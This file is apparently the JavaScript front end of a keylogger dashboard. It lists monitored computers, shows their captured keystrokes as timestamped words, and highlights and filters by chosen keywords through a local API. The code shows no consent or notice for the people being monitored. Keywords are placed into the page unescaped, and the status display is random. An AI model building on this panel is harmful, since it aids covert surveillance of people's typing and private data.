const computerList = document.getElementById('computer-grid');
const dashboardContainer = document.getElementById('dashboard-container');
const keystrokeViewer = document.getElementById('keystroke-viewer');
const computerNameDisplay = document.getElementById('computer-name');
const keystrokeLog = document.getElementById('keystroke-log');
const backButton = document.getElementById('back-button');
const searchInput = document.getElementById('search-input');
const keystrokeSearchInput = document.getElementById('keystroke-search-input');
const loginContainer = document.getElementById('login-container');
const signupContainer = document.getElementById('signup-container');
const showSignupLink = document.getElementById('show-signup');
const showLoginLink = document.getElementById('show-login');
const loginForm = document.getElementById('login-form');
const signupForm = document.getElementById('signup-form');
const logoutButton = document.getElementById('logout-button');
const addComputerButton = document.getElementById('add-computer-button');
const totalComputersDisplay = document.getElementById('total-computers');
const totalKeystrokesDisplay = document.getElementById('total-keystrokes');
const keywordInput = document.getElementById('keyword-input');
const addKeywordButton = document.getElementById('add-keyword-button');
const keywordListContainer = document.getElementById('keyword-list');
const startTimeInput = document.getElementById('start-time-input');
const endTimeInput = document.getElementById('end-time-input');

let currentComputer = null;

loginForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        const response = await fetch('http://127.0.0.1:8000/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        if (response.ok) {
            alert(data.message);
            loginContainer.style.display = 'none';
            showDashboard();
            await renderComputers();
            await renderKeywords();
        } else {
            alert(data.message);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
});

signupForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    const username = document.getElementById('new-username').value;
    const password = document.getElementById('new-password').value;

    const hasUppercase = /[A-Z]/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
    const isNineDigits = /^\d{9}$/.test(username);

    if (password.length < 8) {
        alert('Password must be at least 8 characters long.');
        return;
    }
    if (!hasUppercase) {
        alert('Password must contain at least one uppercase letter.');
        return;
    }
    if (!hasSpecialChar) {
        alert('Password must contain at least one special character.');
        return;
    }
    if (!isNineDigits) {
        alert('User ID must be exactly 9 numbers.');
        return;
    }

    try {
        const response = await fetch('http://127.0.0.1:8000/api/signup', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        alert(data.message);
        if (response.ok) {
            loginContainer.style.display = 'flex';
            signupContainer.style.display = 'none';
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
});

function logout() {
    loginContainer.style.display = 'flex';
    dashboardContainer.style.display = 'none';
    searchInput.value = '';
    keystrokeSearchInput.value = '';
}

async function fetchComputers() {
    try {
        const response = await fetch('http://127.0.0.1:8000/api/computers');
        if (!response.ok) {
            throw new Error('Failed to fetch computers');
        }
        const data = await response.json();
        return Object.keys(data).map(key => ({
            id: key,
            name: data[key].name,
            keystrokes: [] 
        }));
    } catch (error) {
        console.error('Error fetching computers:', error);
        return [];
    }
}

async function renderComputers() {
    const computers = await fetchComputers();
    computerList.innerHTML = '';
    computers.forEach(computer => {
        const computerCard = document.createElement('div');
        computerCard.classList.add('computer-card');
        computerCard.dataset.id = computer.id;

        const statusIndicator = document.createElement('div');
        statusIndicator.classList.add('status-indicator', `status-${getStatus()}`);

        const computerIcon = document.createElement('span');
        computerIcon.classList.add('material-symbols-outlined');
        computerIcon.textContent = 'laptop_mac';

        const nameContainer = document.createElement('div');
        nameContainer.classList.add('name-container');

        const computerName = document.createElement('h3');
        computerName.textContent = computer.name;

        const editIcon = document.createElement('span');
        editIcon.classList.add('edit-icon');
        editIcon.textContent = '✎';

        editIcon.addEventListener('click', (event) => {
            event.stopPropagation();
            showRenameInput(computerCard, computer.name);
        });

        nameContainer.appendChild(computerName);
        nameContainer.appendChild(editIcon);

        const deleteIcon = document.createElement('span');
        deleteIcon.classList.add('delete-icon');
        deleteIcon.textContent = '✖';

        deleteIcon.addEventListener('click', (event) => {
            event.stopPropagation();
            deleteComputer(computer.id);
        });

        computerCard.appendChild(statusIndicator);
        computerCard.appendChild(computerIcon);
        computerCard.appendChild(nameContainer);
        computerCard.appendChild(deleteIcon);
        computerList.appendChild(computerCard);

        computerCard.addEventListener('click', () => {
            showViewer(computer);
        });
    });

    totalComputersDisplay.textContent = computers.length;
}

async function addComputer() {
    const newComputerName = prompt('Enter the name of the new computer:');
    if (newComputerName) {
        try {
            const response = await fetch('http://127.0.0.1:8000/api/computers', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: newComputerName })
            });
            if (response.ok) {
                alert('Computer added successfully!');
                await renderComputers();
            } else {
                alert('Failed to add computer.');
            }
        } catch (error) {
            console.error('Error adding computer:', error);
            alert('An error occurred. Please try again.');
        }
    }
}

async function deleteComputer(computerId) {
    const confirmed = confirm('Are you sure you want to delete this computer?');
    if (confirmed) {
        try {
            const response = await fetch(`http://127.0.0.1:8000/api/computers/${computerId}`, {
                method: 'DELETE'
            });
            if (response.ok) {
                alert('Computer deleted successfully!');
                await renderComputers();
            } else {
                alert('Failed to delete computer.');
            }
        } catch (error) {
            console.error('Error deleting computer:', error);
            alert('An error occurred. Please try again.');
        }
    }
}

async function fetchKeystrokes(computerId) {
    try {
        const response = await fetch(`http://127.0.0.1:8000/api/keystrokes/${computerId}`);
        if (!response.ok) {
            throw new Error('Failed to fetch keystrokes');
        }
        return await response.json();
    } catch (error) {
        console.error('Error fetching keystrokes:', error);
        return [];
    }
}

async function showViewer(computer) {
    dashboardContainer.style.display = 'none';
    keystrokeViewer.style.display = 'block';
    computerNameDisplay.textContent = computer.name;
    currentComputer = computer;
    
    // The server now sends words directly, no need to process
    const wordsLog = await fetchKeystrokes(computer.id);
    
    document.getElementById('word-log').innerHTML = '';
    
    renderWords(wordsLog);
    
    const lastConnectedDisplay = document.getElementById('last-connected');
    lastConnectedDisplay.textContent = new Date().toLocaleString();

    // Update the total keystrokes display.
    totalKeystrokesDisplay.textContent = wordsLog.length;
}

async function fetchKeywords() {
    try {
        const response = await fetch('http://127.0.0.1:8000/api/keywords');
        if (!response.ok) {
            throw new Error('Failed to fetch keywords');
        }
        return await response.json();
    } catch (error) {
        console.error('Error fetching keywords:', error);
        return [];
    }
}

async function renderKeywords() {
    const keywords = await fetchKeywords();
    keywordListContainer.innerHTML = '';
    keywords.forEach(keyword => {
        const tag = document.createElement('div');
        tag.classList.add('tag');
        tag.innerHTML = `<span>${keyword}</span><span class="tag-remove">✖</span>`;
        tag.querySelector('.tag-remove').addEventListener('click', async () => {
            const deleteResponse = await fetch(`http://127.0.0.1:8000/api/keywords/${keyword}`, {
                method: 'DELETE'
            });
            if (deleteResponse.ok) {
                await renderKeywords();
                if (currentComputer) {
                    await showViewer(currentComputer);
                }
            }
        });
        keywordListContainer.appendChild(tag);
    });
}

async function handleAddKeyword() {
    const newKeyword = keywordInput.value.trim().toLowerCase();
    if (newKeyword) {
        try {
            const response = await fetch('http://127.0.0.1:8000/api/keywords', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ keyword: newKeyword })
            });
            if (response.ok) {
                alert('Keyword added!');
                await renderKeywords();
                keywordInput.value = '';
                if (currentComputer) {
                    await showViewer(currentComputer);
                }
            } else {
                alert('Failed to add keyword.');
            }
        } catch (error) {
            console.error('Error adding keyword:', error);
        }
    }
}

function getStatus() {
    return Math.random() > 0.5 ? 'online' : 'offline';
}

function showDashboard() {
    dashboardContainer.style.display = 'block';
    keystrokeViewer.style.display = 'none';
    keystrokeSearchInput.value = '';
    startTimeInput.value = '';
    endTimeInput.value = '';
}

function showRenameInput(card, currentName) {
    const oldTextSpan = card.querySelector('h3');
    const oldIconSpan = card.querySelector('.edit-icon');

    const input = document.createElement('input');
    input.type = 'text';
    input.value = currentName;
    input.classList.add('rename-input', 'styled-input');

    const saveButton = document.createElement('button');
    saveButton.textContent = 'Save';
    saveButton.classList.add('rename-save');

    const cancelButton = document.createElement('button');
    cancelButton.textContent = 'Cancel';
    cancelButton.classList.add('rename-cancel');

    oldTextSpan.style.display = 'none';
    oldIconSpan.style.display = 'none';
    card.appendChild(input);
    card.appendChild(saveButton);
    card.appendChild(cancelButton);

    saveButton.addEventListener('click', async (event) => {
        event.stopPropagation();
        const newName = input.value;
        const computerId = card.dataset.id;
        try {
            const response = await fetch(`http://127.0.0.1:8000/api/computers/rename/${computerId}`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ new_name: newName })
            });
            if (response.ok) {
                oldTextSpan.textContent = newName;
                oldTextSpan.style.display = 'block';
                oldIconSpan.style.display = 'block';
                card.removeChild(input);
                card.removeChild(saveButton);
                card.removeChild(cancelButton);
                alert('Computer renamed successfully!');
            } else {
                alert('Failed to rename computer.');
            }
        } catch (error) {
            console.error('Error renaming computer:', error);
            alert('An error occurred. Please try again.');
        }
    });

    cancelButton.addEventListener('click', (event) => {
        event.stopPropagation();
        oldTextSpan.style.display = 'block';
        oldIconSpan.style.display = 'block';
        card.removeChild(input);
        card.removeChild(saveButton);
        card.removeChild(cancelButton);
    });
}

function renderWords(wordsToRender) {
    const wordLogContainer = document.getElementById('word-log');
    if (!wordLogContainer) return;

    wordLogContainer.innerHTML = '';

    fetchKeywords().then(keywords => {
        wordsToRender.forEach(item => {
            const wordTag = document.createElement('div');
            wordTag.classList.add('word-tag');
            
            if (keywords.includes(item.key.toLowerCase())) {
                wordTag.classList.add('highlight');
            }
            
            const keyElement = document.createElement('span');
            keyElement.classList.add('keystroke-key', 'keystroke-word');
            keyElement.textContent = item.key;
            
            const timestampElement = document.createElement('span');
            timestampElement.classList.add('keystroke-timestamp');
            const keystrokeDate = new Date(item.timestamp);
            timestampElement.textContent = keystrokeDate.toLocaleString();
            
            wordTag.appendChild(keyElement);
            wordTag.appendChild(timestampElement);
            wordLogContainer.appendChild(wordTag);
        });
    });
}

function filterLogs() {
    if (currentComputer) {
        const textQuery = keystrokeSearchInput.value.toLowerCase();
        const startTime = startTimeInput.value ? new Date(startTimeInput.value) : null;
        const endTime = endTimeInput.value ? new Date(endTimeInput.value) : null;

        fetchKeystrokes(currentComputer.id).then(wordsLog => {
            const filteredWords = wordsLog.filter(item => {
                const itemTime = new Date(item.timestamp);
                const matchesText = item.key.toLowerCase().includes(textQuery);
                const inTimeRange = (!startTime || itemTime >= startTime) && (!endTime || itemTime <= endTime);
                return matchesText && inTimeRange;
            });
            
            renderWords(filteredWords);

            // Update the total keystrokes display based on the filtered data
            totalKeystrokesDisplay.textContent = filteredWords.length;
        });
    }
}

// NOTE: This function is no longer needed since the server sends words directly.
// We are keeping it here for clarity but it's not used by the rest of the code.
// You can safely remove it if you wish.
function processKeystrokes(keystrokes) {
    const processedLog = [];
    const wordsLog = [];
    let currentWord = '';

    keystrokes.forEach((keystroke) => {
        const key = keystroke.key;
        const isWordCharacter = /^[a-zA-Z]$/.test(key);
        const isSpaceOrPunctuation = /^[ .,?!]$/.test(key) || key === 'space';

        if (isWordCharacter) {
            currentWord += key;
            processedLog.push(keystroke);
        } else if (isSpaceOrPunctuation) {
            if (currentWord.length > 0) {
                const wordKeystroke = { key: currentWord, timestamp: keystroke.timestamp, isWord: true };
                wordsLog.push(wordKeystroke);
            }
            processedLog.push(keystroke);
            currentWord = '';
        } else {
            if (currentWord.length > 0) {
                const wordKeystroke = { key: currentWord, timestamp: keystroke.timestamp, isWord: true };
                wordsLog.push(wordKeystroke);
                currentWord = '';
            }
            processedLog.push(keystroke);
        }
    });

    if (currentWord.length > 0) {
        wordsLog.push({ key: currentWord, timestamp: keystrokes[keystrokes.length - 1].timestamp, isWord: true });
    }

    return { keystrokes: processedLog, words: wordsLog };
}

backButton.addEventListener('click', showDashboard);
logoutButton.addEventListener('click', logout);
addKeywordButton.addEventListener('click', handleAddKeyword);
addComputerButton.addEventListener('click', addComputer);

searchInput.addEventListener('input', async (event) => {
    const query = event.target.value;
    const computers = await fetchComputers();
    const filteredComputers = computers.filter(computer =>
        computer.name.toLowerCase().includes(query.toLowerCase())
    );
    renderComputers(filteredComputers);
});

keystrokeSearchInput.addEventListener('input', () => {
    filterLogs();
});

showSignupLink.addEventListener('click', (event) => {
    event.preventDefault();
    loginContainer.style.display = 'none';
    signupContainer.style.display = 'flex';
});

showLoginLink.addEventListener('click', (event) => {
    event.preventDefault();
    loginContainer.style.display = 'flex';
    signupContainer.style.display = 'none';
});

flatpickr("#start-time-input", {
    enableTime: true,
    dateFormat: "d/m/Y, h:i K",
    onChange: function() {
        filterLogs();
    }
});

flatpickr("#end-time-input", {
    enableTime: true,
    dateFormat: "d/m/Y, h:i K",
    onChange: function() {
        filterLogs();
    }
});